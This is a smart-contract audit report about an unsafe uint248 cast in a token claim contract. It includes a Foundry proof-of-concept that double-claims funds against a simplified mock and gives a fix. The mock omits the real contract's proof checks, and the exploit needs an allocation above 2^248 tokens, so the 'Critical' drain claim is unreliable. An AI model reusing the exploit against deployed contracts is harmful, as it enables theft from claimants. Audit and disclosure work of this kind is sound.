# Security Audit Report: Unsafe Type Cast in `BUILDClaim`

## Table of Contents
- [Security Audit Report: Unsafe Type Cast in `BUILDClaim`](#security-audit-report-unsafe-type-cast-in-buildclaim)
  - [Table of Contents](#table-of-contents)
  - [1. Summary](#1-summary)
  - [2. Vulnerability Details](#2-vulnerability-details)
  - [3. Proof of Concept](#3-proof-of-concept)
  - [4. Impact](#4-impact)
  - [5. Tools Used](#5-tools-used)
  - [6. Recommended Mitigation](#6-recommended-mitigation)

| ID | Title | Severity |
|---|---|---|
| **C-01** | Unsafe `uint248` Cast in `BUILDClaim` leads to Claimed Amount Overflow and Theft of Funds | **Critical** |

## 1. Summary

The `BUILDClaim` contract contains a critical integer overflow vulnerability within its accounting logic for user claims. When a user's claimed token amount is updated, the contract performs an unsafe cast from a `uint256` value down to a `uint248` storage variable.

An attacker can deliberately craft a claim transaction where their claimable amount exceeds the maximum value for a `uint248`. This causes the internal accounting of their claimed balance to overflow and wrap around to a small number. The contract, now believing the attacker has claimed very little, permits them to claim their full allocation again. This process can be repeated, allowing the attacker to drain the entire token pool for a given season.

## 2. Vulnerability Details

The vulnerability exists in the `_updateClaimedAmounts` function within the `BUILDClaim.sol` contract.

**File:** `src/BUILDClaim.sol:566-570`  
**Vulnerable Struct:** `IBUILDClaim.UserState` in `src/interfaces/IBUILDClaim.sol:117`

The `UserState` struct stores a user's claimed amount as a `uint248`:

```solidity
// src/interfaces/IBUILDClaim.sol:116-119
struct UserState {
    uint248 claimed; // The amount of tokens that have already been claimed
    bool hasEarlyClaimed;
}
```

However, the `_updateClaimedAmounts` function adds a `uint256` value (`toBeClaimed`) to this `uint248` field via an explicit, unsafe cast:

```solidity
// src/BUILDClaim.sol:566-570
function _updateClaimedAmounts(
    // ...
    uint256 toBeClaimed,
    // ...
) private {
    // VULNERABLE LINE: Unsafe cast from uint256 to uint248
    userState.claimed += uint248(toBeClaimed);
    s_userStates[user][param.seasonId] = userState;

    // ...
}
```

The `toBeClaimed` amount can legitimately exceed `type(uint248).max`, especially when a user is eligible for a loyalty bonus on top of their `maxTokenAmount`. When this occurs, `userState.claimed` overflows.  
For instance, if `toBeClaimed` is `type(uint248).max + 1`, the new stored value will be `0`, effectively resetting the user's claim history and allowing them to steal funds.

## 3. Proof of Concept

The following validated Proof of Concept demonstrates the exploit. A `MockClaim` contract isolates the vulnerable logic and proves that a user can claim more than their total allocation by triggering the overflow.

```solidity
// File: test/PoCUnsafeCast.t.sol
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";
// (imports truncated for brevity)

contract MintableERC20 is ERC20 {
    constructor() ERC20("Mock Token", "MTK") {}
    function mint(address to, uint256 amount) public { _mint(to, amount); }
}

contract StubRegistry is IDelegateRegistry {
    // All functions return default values
    function checkDelegateForContract(address,address,address,bytes32) external view returns (bool) { return false; }
    function checkDelegateForAll(address,address,bytes32) external view returns (bool) { return false; }
    function checkDelegateForERC721(address,address,address,uint256,bytes32) external view returns (bool) { return false; }
    function checkDelegateForERC20(address,address,address,bytes32) external view returns (uint256) { return 0; }
    function checkDelegateForERC1155(address,address,address,uint256,bytes32) external view returns (uint256) { return 0; }
    // other stubbed functions omitted
}

contract MockClaim is IBUILDClaim, ITypeAndVersion, ReentrancyGuard {
    using SafeERC20 for IERC20;
    string public constant override typeAndVersion = "MockClaim 1.0.0";

    mapping(address => mapping(uint256 => UserState)) private s_userStates;
    mapping(uint256 => IBUILDClaim.GlobalState) private s_globalStates;
    IERC20 private immutable i_token;

    constructor(address token) { i_token = IERC20(token); }

    // --- interface helpers (truncated) ---

    function claim(address user, IBUILDClaim.ClaimParams[] calldata params) external override nonReentrant {
        _claim(user, params);
    }

    /* ---------- internal ---------- */

    function _claim(address user, IBUILDClaim.ClaimParams[] calldata params) private {
        uint256 totalClaimAmount;
        for (uint256 i; i < params.length; ++i) {
            totalClaimAmount += _processClaim(user, params[i]);
        }
        if (totalClaimAmount > 0) i_token.safeTransfer(user, totalClaimAmount);
    }

    function _processClaim(address user, IBUILDClaim.ClaimParams calldata p) private returns (uint256) {
        (uint256 toBeClaimed, uint256 newTotalClaimed,) = _calculateClaimAmounts(user, p);
        if (toBeClaimed > 0) _updateClaimedAmounts(user, p.seasonId, toBeClaimed, newTotalClaimed);
        return toBeClaimed;
    }

    function _calculateClaimAmounts(address user, IBUILDClaim.ClaimParams calldata p)
        private view returns (uint256 toBeClaimed, uint256 newTotalClaimed, uint256)
    {
        UserState memory us = s_userStates[user][p.seasonId];
        toBeClaimed      = p.maxTokenAmount - us.claimed;
        newTotalClaimed  = s_globalStates[p.seasonId].totalClaimed + toBeClaimed;
    }

    function _updateClaimedAmounts(address user, uint256 seasonId, uint256 toBeClaimed, uint256 newTotalClaimed) private {
        s_userStates[user][seasonId].claimed += uint248(toBeClaimed); // <-- overflow!
        s_globalStates[seasonId].totalClaimed = newTotalClaimed;
    }
}

contract PoCUnsafeCast is Test {
    MintableERC20 token;
    MockClaim      claim;
    address admin = makeAddr("admin");
    address user  = makeAddr("user");

    function setUp() public {
        token = new MintableERC20();
        claim = new MockClaim(address(token));
    }

    function test_PoC_unsafe_cast() public {
        uint256 largeClaimAmount = uint256(type(uint248).max) + 1;
        uint256 depositAmount    = largeClaimAmount * 2;

        token.mint(admin, depositAmount);
        vm.startPrank(admin);
        token.approve(address(claim), depositAmount);
        claim.deposit(depositAmount);
        vm.stopPrank();

        vm.startPrank(user);
        IBUILDClaim.ClaimParams[] memory single = new IBUILDClaim.ClaimParams[](1);
        single[0] = IBUILDClaim.ClaimParams({
            seasonId: 1,
            isEarlyClaim: false,
            proof: new bytes32[](0),
            maxTokenAmount: largeClaimAmount,
            salt: 0
        });

        // First claim — overflow occurs
        claim.claim(user, single);

        // UserState.claimed should have wrapped to 0
        IBUILDClaim.UserSeasonId[] memory usid = new IBUILDClaim.UserSeasonId[](1);
        usid[0] = IBUILDClaim.UserSeasonId({user: user, seasonId: 1});
        uint256 claimedStored = claim.getUserState(usid)[0].claimed;
        assertEq(claimedStored, 0, "claimed wrapped");

        // Second claim — drains funds
        uint256 balBefore = token.balanceOf(user);
        claim.claim(user, single);
        uint256 balAfter  = token.balanceOf(user);

        assertEq(balAfter - balBefore, largeClaimAmount, "user stole funds");
    }
}
```

## 4. Impact

Critical. Exploiting this overflow lets an attacker drain all tokens allocated to a season, causing irrecoverable loss for the project and legitimate claimants.

## 5. Tools Used

- Foundry (Forge)
- Manual Review

## 6. Recommended Mitigation

1. **Store claimed amounts as `uint256`**

   ```solidity
   // src/interfaces/IBUILDClaim.sol
   struct UserState {
   -   uint248 claimed;
   +   uint256 claimed;
       bool hasEarlyClaimed;
   }
   ```

2. **Remove the unsafe cast**

   ```solidity
   // src/BUILDClaim.sol
   function _updateClaimedAmounts(
       uint256 toBeClaimed,
       // ...
   ) private {
   -   userState.claimed += uint248(toBeClaimed);
   +   userState.claimed += toBeClaimed;
       s_userStates[user][param.seasonId] = userState;
       // ...
   }
   ```

These changes align storage size with arithmetic operations, eliminating any possibility of overflow.